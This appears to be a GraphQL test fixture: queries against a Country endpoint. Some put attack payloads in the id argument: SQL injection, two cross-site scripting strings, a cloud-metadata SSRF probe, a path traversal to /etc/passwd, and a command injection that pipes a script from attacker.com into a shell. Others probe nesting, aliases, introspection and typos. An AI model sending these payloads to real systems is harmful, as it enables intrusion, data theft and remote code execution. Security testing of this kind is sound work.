query.query:
query Country {
  Country(id: "US") {
    id
    name
    itemCount
  }
}

query Country {
  Country(id: "1' UNION SELECT NULL,version(),NULL--") {
    id
    type
    identifier
  }
}

query Country {
  Country(id: "XX\u003cscript\u003ealert(1)\u003c/script\u003e") {
    id
    name
    history
  }
}

query Country {
  Country(id: "internal-service-http://169.254.169.254/latest/meta-data") {
    id
    repositories {
      items {
        latitude
        longitude
      }
    }
  }
}

query Country {
  Country(id: ";curl${IFS}attacker.com/pwn|sh;") {
    id
    systemEvents {
      timestamp
    }
  }
}

query Country {
  Country(id: "../../../../etc/passwd") {
    id
    summary
    extensive
  }
}

query Country {
  Country(id: "<img src=x onerror=alert(document.domain)>") {
    id
    situation
    annotations {
      body
    }
  }
}

query {
  Country(id: "US") {
    id
    name
    repositories {
      items {
        documentaryUnits {
          items {
            id
          }
        }
      }
    }
  }
}

query {
  s: Country(id: "US") {
    id
    n1: name
    r1: repositories {
      i1: items {
        d1: documentaryUnits {
          i2: items {
            id
          }
        }
      }
    }
  }
}

query {
  Country {
    types {
      name
      fields {
        name
        type {
          name
          kind
        }
      }
    }
  }
}

query Country {
  Country(id: "US") {
    id
    naem
    sumary
    repositoris
  }
}
